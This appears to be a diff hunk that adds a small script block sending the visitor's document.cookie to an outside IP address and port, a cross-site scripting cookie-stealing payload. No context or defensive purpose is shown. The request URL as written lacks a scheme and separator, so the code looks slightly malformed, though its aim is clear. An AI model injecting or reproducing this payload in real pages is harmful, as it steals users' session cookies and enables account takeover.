@@ -1,0 +1,6 @@
+<SCRIPT>
+var XMLHttpRequestObject = new XMLHttpRequest();
+XMLHttpRequestObject.open('GET', '152.7.224.5:9000' + document.cookie, false);
+  XMLHttpRequestObject.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  XMLHttpRequestObject.send(null);
+</SCRIPT>
